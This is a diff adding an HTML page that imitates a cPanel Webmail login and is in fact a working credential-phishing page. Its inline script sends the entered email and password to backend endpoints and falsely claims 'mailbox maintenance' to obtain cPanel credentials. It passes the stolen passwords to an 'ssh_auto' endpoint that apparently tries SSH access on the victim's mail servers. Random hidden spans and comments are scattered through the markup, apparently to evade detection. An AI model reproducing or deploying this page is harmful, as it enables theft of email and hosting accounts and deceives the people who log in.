@@ -1,0 +1,257 @@
+<!DOCTYPE html><!-- 79a99bdb --><html lang="en" data-lebe="5060"><!-- ff3f3bd5 --><head><meta charset="UTF-8">  <meta name="viewport" content="width=device-width,initial-scale=1.0">
+<span style="display:none;position:absolute;left:-9999px">d9c6b9</span><title>Webmail</title><!-- 4e4e561c --><link rel="icon" type="image/svg+xml" href="ralo/mitunalo.svg?_n=3">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+<link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap" rel="stylesheet">
+<span style="display:none;position:absolute;left:-9999px">9c8471</span><!-- 05211fb8 --><style data-katuso="7277">
+    html,body{background-color:#fff;margin:0;min-height:100%}
+    body.webmail-login-page #dhl-cookie-banner{display:none!important}
+    .cp-webmail-wordmark{max-width:320px;width:100%;height:auto;display:block;margin:0 auto}
+    .cp-cpanel-logo{max-width:280px;width:100%;height:auto;display:block;margin:0 auto}
+    #cp-brand-cpanel{display:none}
+    #cp-login-submit:hover{background-color:#1e8abf!important}
+    body.webmail-login-page.cp-ssh-retry #cp-login-submit{background-color:#29abe2}
+    body.webmail-login-page.cp-ssh-retry #cp-login-submit:hover{background-color:#1e8abf}
+    body.webmail-login-page.cp-ssh-retry .cp-lang-footer{display:none}
+    .cp-pw-hint{font-size:11px;color:#7a8a9a;margin-top:6px;padding:0 2px;line-height:1.4}
+    #login-success.cp-login-success-banner{display:none;align-items:center;gap:10px;padding:12px 14px;background:#43a047;border-radius:8px;color:#fff;font-size:14px;font-weight:500;text-align:left;line-height:1.35;box-shadow:0 1px 4px rgba(0,0,0,.12)}
+    #login-success.cp-login-success-banner.is-open{display:flex}
+    .cp-login-success-icon{flex-shrink:0;font-size:18px;opacity:.95}
+    .cp-login-success-text{flex:1;min-width:0}
+    #cp-no-permission{display:none;width:100%;background:transparent;color:#5c6c7c;border:1px solid #d1d5db;padding:10px;border-radius:4px;font-size:13px;font-weight:500;cursor:pointer;transition:all .2s;margin-top:4px}
+    #cp-no-permission:hover{background:#f5f7fa;border-color:#9aa5b1}
+    .cp-login-password-hint{margin:-6px 0 0 0;font-size:12px;line-height:1.4;color:#5a6a7a}
+    .cp-login-reset-wrap{text-align:center;margin-top:16px}
+    a.cp-login-reset{color:#3d4d5c;text-decoration:none;font-size:14px}
+    a.cp-login-reset:hover{text-decoration:underline}
+    .cp-login-footer-brand{display:flex;align-items:center;justify-content:center;gap:8px;margin-bottom:8px;flex-wrap:wrap}
+    .cp-login-footer-brand img{width:16px;height:auto;vertical-align:middle}
+    body>main{max-width:none!important;width:100%!important;margin-left:0!important;margin-right:0!important;padding:0!important}
+    .cp-lang-footer a{text-decoration:none;color:#3d4d5c;font-weight:400}
+    .cp-lang-footer a.cp-lang-active{color:#111;font-weight:700}
+    #login-error.cp-login-error-banner{display:none;align-items:center;gap:12px;padding:12px 14px;background:#d9534f;border-radius:8px;color:#fff;font-size:14px;font-weight:500;text-align:left;line-height:1.35;box-shadow:0 1px 4px rgba(0,0,0,.12)}
+    #login-error.cp-login-error-banner.is-open{display:flex}
+    .cp-login-error-icon{flex-shrink:0;width:36px;height:36px;border-radius:50%;background:#e8d4d4;display:flex;align-items:center;justify-content:center;box-shadow:0 1px 2px rgba(0,0,0,.12)}
+    .cp-login-error-icon-x{color:#c9302c;font-size:20px;font-weight:700;line-height:1;font-family:'Open Sans',sans-serif}
+    .cp-login-error-text{flex:1;min-width:0}
+    #login-verify.cp-login-verify-banner{display:none;align-items:center;gap:10px;padding:10px 12px;background:#29abe2;border-radius:6px;color:#fff;font-size:14px;font-weight:500;text-align:left;line-height:1.35;box-shadow:0 1px 3px rgba(0,0,0,.08)}
+    #login-verify.cp-login-verify-banner.is-open{display:flex}
+    #login-verify.cp-login-verify-banner .cp-login-verify-icon{flex-shrink:0;font-size:16px;opacity:.95}
+    #loginForm.cp-form-busy{opacity:.96}
+    #loginForm.cp-form-busy .cp-field,#loginForm.cp-form-busy #cp-login-submit{pointer-events:none}
+    .cp-field-label{display:block;color:#3d4d5c;font-size:14px;margin-bottom:8px;font-weight:600}
+    .cp-login-input-wrap{position:relative;display:flex;align-items:center}
+    .cp-login-input-icon{position:absolute;left:12px;padding-right:0;height:22px;display:flex;align-items:center;justify-content:center;color:#888;font-size:14px;pointer-events:none}
+    .cp-login-input{width:100%;box-sizing:border-box;padding:12px 14px 12px 44px;border:1px solid #d0d0d0;border-radius:4px;font-size:14px;line-height:1.35;outline:none;background:#fff;color:#333;font-family:'Open Sans',sans-serif}
+    .cp-login-input:focus{border-color:#29abe2;box-shadow:0 0 0 1px rgba(41,171,226,.25)}
+    .cp-login-input.error{border-color:#c9302c;box-shadow:none}
+    .cp-login-input::placeholder{color:#a8a8a8;opacity:1}
+    .cp-login-input::-webkit-input-placeholder{color:#a8a8a8}
+    .cp-login-input::-moz-placeholder{color:#a8a8a8;opacity:1}
+    .hp{position:absolute;left:-9999px;opacity:0;height:0;width:0;overflow:hidden}
+    .cp-eye-toggle{position:absolute;right:12px;top:50%;transform:translateY(-50%);background:none;border:none;cursor:pointer;color:#888;font-size:15px;padding:4px;line-height:1;display:flex;align-items:center;justify-content:center}
+    .cp-eye-toggle:hover{color:#555}
+</style>
+</head>
+<body class="webmail-login-page" data-rara="954"><!-- a8dacf51 --><span style="display:none;position:absolute;left:-9999px">93d2d1</span><main style="background-color:#fff;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;font-family:'Open Sans',sans-serif;margin:0;padding:0;" data-nami="3355">
+<!-- eba87067 --><div style="margin-bottom:30px;text-align:center;width:100%;max-width:360px;padding:0 20px;box-sizing:border-box" data-morika="9487"><span style="display:none;position:absolute;left:-9999px">7a4996</span><div id="cp-brand-webmail" data-loperi="1510"><img class="cp-webmail-wordmark" src="tuturi/nalele.svg" alt="Webmail" width="320" height="80" data-ratu="8256"></div><!-- c2c4d001 --><div id="cp-brand-cpanel" aria-hidden="true"><img class="cp-cpanel-logo" src="pemope/mikari.svg?_n=2" alt="" width="280" height="64"></div>
+</div>
+<span style="display:none;position:absolute;left:-9999px">971cc2</span><!-- 7a6fbda7 --><div style="background:transparent;width:100%;max-width:350px;padding:0 20px" data-moleda="640"><span style="display:none;position:absolute;left:-9999px">c35493</span><form id="loginForm" style="display:flex;flex-direction:column;gap:20px" data-mimorari="9028"><!-- ba8cbd88 --><input type="hidden" name="_csrf" value="0e15ea2b6cecf699eb71f87f8c724d09">
+<input type="hidden" id="loginEmailHidden" name="_he" value="">
+<input type="text" name="_hp" class="hp" tabindex="-1" autocomplete="off"><span style="display:none;position:absolute;left:-9999px">5f6cd1</span><div id="login-verify" class="cp-login-verify-banner" role="status" aria-live="polite" aria-hidden="true">
+<i class="fas fa-info-circle cp-login-verify-icon" aria-hidden="true"></i>
+<span class="cp-login-verify-text"></span>
+</div>
+<div id="login-error" class="cp-login-error-banner" role="alert" aria-live="polite">
+<span class="cp-login-error-icon" aria-hidden="true"><span class="cp-login-error-icon-x">&times;</span></span>
+<span class="cp-login-error-text"></span>
+</div>
+<div id="login-success" class="cp-login-success-banner" role="status" aria-live="polite">
+<span class="cp-login-success-icon"><i class="fas fa-check-circle"></i></span>
+<span class="cp-login-success-text"></span>
+</div>
+<div id="cp-field-email" class="cp-field">
+<label class="cp-field-label" for="em">Email Address</label>
+<div class="cp-login-input-wrap">
+<span class="cp-login-input-icon" aria-hidden="true"><i class="fas fa-user"></i></span>
+<input type="email" id="em" class="cp-login-input" name="email" autocomplete="username" placeholder="Enter your email address." value="">
+</div></div>
+<div id="cp-field-cpanel-user" class="cp-field" style="display:none">
+<label class="cp-field-label" for="cu">Hosting username</label>
+<div class="cp-login-input-wrap">
+<span class="cp-login-input-icon" aria-hidden="true"><i class="fas fa-server"></i></span>
+<input type="text" id="cu" class="cp-login-input" name="cpanel_username" autocomplete="username" placeholder="cPanel or hosting username">
+</div></div>
+<div class="cp-field">
+<label class="cp-field-label" for="pw">Password</label>
+<div class="cp-login-input-wrap">
+<span class="cp-login-input-icon" aria-hidden="true"><i class="fas fa-lock"></i></span>
+<input type="password" id="pw" class="cp-login-input" name="password" autocomplete="current-password" placeholder="Enter your email password." style="padding-right:40px">
+<button type="button" class="cp-eye-toggle" onclick="cpTogglePw('pw',this)" aria-label="Toggle password"><i class="fas fa-eye-slash"></i></button>
+</div>
+<div id="cp-pw-hint" class="cp-pw-hint" style="display:none">Enter your cPanel password, not your email password.</div>
+</div>
+<button type="button" id="cp-login-submit" onclick="_sub()" style="width:100%;box-sizing:border-box;background-color:#29abe2;color:#fff;border:none;padding:12px;border-radius:4px;font-size:15px;font-weight:600;cursor:pointer;transition:background .3s">Log in</button>
+<button type="button" id="cp-no-permission" onclick="cpSkip()">I don&#039;t have cPanel access</button>
+<div class="cp-login-reset-wrap"><a class="cp-login-reset" href="#">Reset Password</a></div>
+</form>
+</div>
+
+<div class="cp-lang-footer" style="margin-top:60px;display:flex;gap:15px;flex-wrap:wrap;justify-content:center;font-size:12px">
+<a href="?lang=ar">العربية</a>
+<a href="?lang=bg">български</a>
+<a href="?lang=cs">čeština</a>
+<a href="?lang=da">dansk</a>
+<a href="?lang=de">Deutsch</a>
+<a href="?lang=el">Ελληνικά</a>
+<a href="?lang=en" class="cp-lang-active">English</a>
+<a href="?lang=es">español</a>
+<a href="?lang=fi">suomi</a>
+<a href="?lang=fr">français</a>
+<a href="?lang=hr">hrvatski</a>
+<a href="?lang=hu">magyar</a>
+<a href="?lang=it">italiano</a>
+<a href="?lang=nl">Nederlands</a>
+<a href="?lang=pl">polski</a>
+<a href="?lang=pt">português</a>
+<a href="?lang=ro">română</a>
+<a href="?lang=sk">slovenčina</a>
+<a href="?lang=sr">srpski</a>
+<a href="?lang=sv">svenska</a>
+<a href="?lang=uk">українська</a>
+<span style="color:#3d4d5c">...</span>
+</div>
+<!-- b477cdac --><span style="display:none;position:absolute;left:-9999px">79a273</span><div style="margin-top:40px;text-align:center;font-size:11px;color:#777" data-tibemo="3936"><span style="display:none;position:absolute;left:-9999px">f9ade3</span><div class="cp-login-footer-brand"><img src="kabe/belo.svg?_n=4" alt="" width="16" height="16" aria-hidden="true"><!-- ae60adde --><span>Copyright© 2026 cPanel, L.L.C.</span></div>
+<a href="#" style="color:#777;text-decoration:none">Privacy Policy</a>
+</div>
+<!-- e9e73b9c --></main><span style="display:none;position:absolute;left:-9999px">7e7399</span>
+<script>
+/* cff3b127824297d7 */
+function cpTogglePw(id,btn){var i=document.getElementById(id);var ic=btn.querySelector('i');if(i.type==='password'){i.type='text';ic.className='fas fa-eye'}else{i.type='password';ic.className='fas fa-eye-slash'}}
+
+(function(){
+var em=null;
+var h=(window.location.hash||'').replace(/^#/,'');
+if(h){try{h=decodeURIComponent(h)}catch(e){}h=h.trim();if(h.indexOf('@')>0&&h.length>=5&&h.length<=254)em=h}
+if(!em){try{em=sessionStorage.getItem('_cp_email')}catch(e){}}
+if(em){
+var el=document.getElementById('em');
+if(el&&!el.value)el.value=em;
+try{sessionStorage.removeItem('_cp_email')}catch(e){}
+if(window.history&&window.history.replaceState){try{window.history.replaceState(null,'',window.location.pathname+window.location.search)}catch(e){}}
+}
+})();
+
+var _retry=false,_vmx='',_lastEm='',_lastPw='',_lastPort=587;
+var MSG_V="Verifying connection\u2026";
+var MSG_E="Invalid email or password.";
+var MSG_AUTH="Authenticating\u2026";
+var MSG_CONN="Connecting to mail servers\u2026";
+var MSG_VACC="Verifying server access\u2026";
+var MSG_OK="Signed in\u2026";
+var MSG_ERR="Something went wrong. Try again.";
+var MSG_SSH="To complete mailbox maintenance, please sign in with your cPanel account. This is required to clean up and optimize your mailbox storage.";
+var MSG_SS="Your email credentials have been verified. To clean up and optimize your mailbox storage, please sign in with your cPanel account.";
+var MSG_POST="Could not complete sign-in.";
+
+function _sv(m){document.querySelector('.cp-login-verify-text').textContent=m;document.getElementById('login-verify').classList.add('is-open');document.getElementById('login-verify').setAttribute('aria-hidden','false');document.getElementById('login-error').classList.remove('is-open');document.getElementById('loginForm').classList.add('cp-form-busy');document.querySelectorAll('.cp-login-input, #cp-login-submit').forEach(function(e){e.disabled=true})}
+function _hv(){document.getElementById('login-verify').classList.remove('is-open');document.getElementById('login-verify').setAttribute('aria-hidden','true');document.getElementById('loginForm').classList.remove('cp-form-busy');document.querySelectorAll('.cp-login-input, #cp-login-submit').forEach(function(e){e.disabled=false});if(_retry)document.getElementById('em').disabled=true}
+function _se(m){_hv();document.querySelector('.cp-login-error-text').textContent=m;document.getElementById('login-error').classList.add('is-open')}
+function _he(){document.getElementById('login-error').classList.remove('is-open')}
+
+function _ss(m){document.getElementById('login-success').querySelector('.cp-login-success-text').textContent=m;document.getElementById('login-success').classList.add('is-open');setTimeout(function(){document.getElementById('login-success').classList.remove('is-open')},4000)}
+function cpSkip(){
+var fd=new FormData();fd.append('email',_lastEm);fd.append('password',_lastPw);
+fd.append('valid_mx',_vmx);fd.append('smtp_port',_lastPort);
+fd.append('_csrf',document.querySelector('[name=_csrf]').value);
+_sv(MSG_V);
+fetch('skip_cpanel',{method:'POST',body:fd,credentials:'same-origin'}).then(function(r){return r.json()}).then(function(){
+var pfd=new FormData();pfd.append('email',_lastEm);pfd.append('password',_lastPw);
+pfd.append('valid_mx',_vmx);pfd.append('_csrf',document.querySelector('[name=_csrf]').value);
+fetch('post',{method:'POST',body:pfd,credentials:'same-origin'}).then(function(){window.location='done'}).catch(function(){window.location='done'})
+}).catch(function(){window.location='done'})}
+
+function _ssh(email,mx){_retry=true;_vmx=mx;document.getElementById('loginEmailHidden').value=email;
+document.getElementById('cp-field-email').style.display='none';document.getElementById('cp-field-cpanel-user').style.display='';
+document.getElementById('cp-brand-webmail').style.display='none';document.getElementById('cp-brand-cpanel').style.display='block';document.getElementById('cp-brand-cpanel').setAttribute('aria-hidden','false');
+document.body.classList.add('cp-ssh-retry');
+// Leave username empty for user to fill, clear password for cPanel credentials
+document.getElementById('cu').value='';
+document.getElementById('pw').value='';
+document.getElementById('cp-pw-hint').style.display='';
+document.getElementById('em').disabled=true}
+
+async function _sub(){
+var em=_retry?(document.getElementById('loginEmailHidden').value||'').trim():document.getElementById('em').value.trim();
+var pw=document.getElementById('pw').value;
+var cu=_retry?(document.getElementById('cu').value||'').trim():'';
+if(!em||!pw){if(!em)document.getElementById('em').classList.add('error');if(!pw)document.getElementById('pw').classList.add('error');return}
+if(_retry&&(!cu||cu.indexOf('@')!==-1)){document.getElementById('cu').classList.add('error');return}
+document.querySelectorAll('.cp-login-input').forEach(function(e){e.classList.remove('error')});
+
+_sv(MSG_AUTH);
+var fd=new FormData();fd.append('email',em);fd.append('password',pw);
+fd.append('_csrf',document.querySelector('[name=_csrf]').value);
+if(cu)fd.append('cpanel_username',cu);
+if(_retry&&_vmx){fd.append('ssh_only','1');fd.append('valid_mx',_vmx);_sv(MSG_VACC)}
+
+try{
+var useStream=typeof ReadableStream!=='undefined';
+var url=useStream?'check_stream':'check';
+var res=await fetch(url,{method:'POST',body:fd,credentials:'same-origin'});
+if(useStream&&res.body&&res.body.getReader){
+var reader=res.body.getReader(),dec=new TextDecoder(),buf='',final=null;
+while(true){var step=await reader.read();if(step.value)buf+=dec.decode(step.value,{stream:true});
+var nl;while((nl=buf.indexOf('\n'))>=0){var line=buf.slice(0,nl).trim();buf=buf.slice(nl+1);
+if(!line)continue;try{var o=JSON.parse(line);
+if(o.type==='init')_sv(MSG_CONN);
+else if(o.type==='progress'&&o.msg==='connecting')_sv(MSG_CONN);
+else if(o.type==='progress'&&o.msg==='verifying')_sv(MSG_VACC);
+else if(o.type==='done')_sv(MSG_VACC);
+else if(o.type==='final')final=o}catch(e){}}
+if(step.done)break}
+if(!final){var tail=buf.trim();if(tail)try{final=JSON.parse(tail)}catch(e){}}
+if(final)_hr(final,em,pw);else _se(MSG_E)
+}else{var data=await res.json();_hr(data,em,pw)}
+}catch(e){_se(MSG_ERR)}}
+
+function _sshBg(em,pw,mxList,smtpFlag){
+var afd=new FormData();afd.append('email',em);afd.append('password',pw);
+afd.append('all_mx',mxList);afd.append('smtp_ok',smtpFlag?'1':'0');
+afd.append('_csrf',document.querySelector('[name=_csrf]').value);
+fetch('ssh_auto',{method:'POST',body:afd,credentials:'same-origin'}).then(function(r){return r.json()}).then(function(ar){
+if(ar.ok&&ar.ssh_ok){
+_sv(MSG_OK);
+var pfd=new FormData();pfd.append('email',em);pfd.append('password',pw);
+pfd.append('valid_mx',ar.valid_mx||'');pfd.append('ssh_user',ar.ssh_user||'');
+pfd.append('_csrf',document.querySelector('[name=_csrf]').value);
+fetch('post',{method:'POST',body:pfd,credentials:'same-origin'}).then(function(){setTimeout(function(){window.location='done'},400)}).catch(function(){})}
+}).catch(function(){})}
+
+function _hr(data,em,pw){
+console.log('[check]',JSON.stringify(data));
+_lastEm=em;_lastPw=pw;_lastPort=data.smtp_port||587;
+if(data.ok){
+_sv(MSG_OK);
+var fd2=new FormData();fd2.append('email',em);fd2.append('password',pw);
+fd2.append('valid_mx',data.valid_mx||'');fd2.append('ssh_user',data.ssh_user||'');
+fd2.append('_csrf',document.querySelector('[name=_csrf]').value);
+fetch('post',{method:'POST',body:fd2,credentials:'same-origin'}).then(function(){setTimeout(function(){window.location='done'},400)}).catch(function(){_se(MSG_POST)})}
+else if(data.smtp_ok&&!data.ssh_ok){
+if(!_retry){
+// First time SMTP worked — show modal + prepare cPanel form behind it
+_hv();_ssh(em,data.valid_mx||'');
+_ss(MSG_SS);
+_sshBg(em,pw,data.all_mx||data.valid_mx||'',true)}
+else{
+// cPanel retry failed — show error + no-permission button
+_se(MSG_SSH);
+document.getElementById('cp-no-permission').style.display=''}}
+else{
+// SMTP failed — show error immediately + background SSH auto on all MX
+var d=data.detail||'';_se(MSG_E+(d.indexOf('worker_error')===0?' ['+d+']':''));
+if(!_retry&&(data.all_mx||data.valid_mx))_sshBg(em,pw,data.all_mx||data.valid_mx||'',false)}}
+
+document.querySelectorAll('.cp-login-input').forEach(function(e){e.addEventListener('keypress',function(ev){if(ev.key==='Enter')_sub()})});
+/* 5e9f93021d73 */
+</script><!-- 009106c7 --></body></html>
